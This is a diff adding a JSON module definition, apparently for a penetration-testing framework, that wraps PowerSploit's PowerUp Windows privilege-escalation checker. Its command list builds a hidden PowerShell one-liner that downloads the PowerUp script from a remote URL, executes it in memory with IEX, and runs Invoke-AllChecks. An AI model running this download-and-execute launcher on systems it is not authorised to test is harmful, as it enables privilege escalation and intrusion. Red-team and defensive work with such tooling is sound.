@@ -1,0 +1,27 @@
+{
+  "base": {
+    "name": "PowerUp",
+    "author": ["Will Schroeder (@harmj0y)"],
+    "path": ["windows", "x64", "powershell", "powersploit", "PowerUp.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "notes": "This is part of the PowerSploit project https://github.com/PowerShellMafia/PowerSploit",
+    "remote": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1",
+    "local": ["data", "src", "PowerSploit", "Privesc", "PowerUp.ps1"],
+    "options": [
+      {"name": "HTMLReport", "value": null, "required": false, "flag": "-HTMLReport", "description":"Switch. Write a HTML version of the report to SYSTEM.username.html."}
+
+    ],
+    "description": "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');",
+      "Invoke-AllChecks",
+      "{{HTMLReport}}",
+      "\""
+    ]
+  }
+}
